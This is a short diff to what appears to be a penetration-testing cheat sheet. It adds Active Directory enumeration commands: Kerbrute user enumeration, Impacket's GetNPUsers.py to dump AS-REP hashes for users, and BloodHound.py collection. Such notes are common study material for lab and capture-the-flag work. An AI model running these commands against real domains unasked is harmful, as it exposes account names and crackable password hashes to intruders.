@@ -280,9 +280,20 @@ Enumeration
             
 -    SMB  
 
--    Kerbrute
+-    Kerbrute  
      `./kerbrute userenum --dc <rhost> -d <domain> <users.txt>`  
                         
+-    Npusers  (Dump hashes for users)  
+     'GetNPUsers.py -dc-ip <rhost> -no-pass -usersfile <users.txt> <domain>/`  
+     
+-    [Bloodhound.py](https://github.com/fox-it/BloodHound.py)  
+
+         edit /etc/resolve.conf
+          nameserver <rhost>
+          search <domain>
+         python3 bloodhound.py -u <user> -p <password> -ns <rhost> -d domain -c all
+         Run Bloodhound
+          
 <br><br>
 
 Web Exploitation
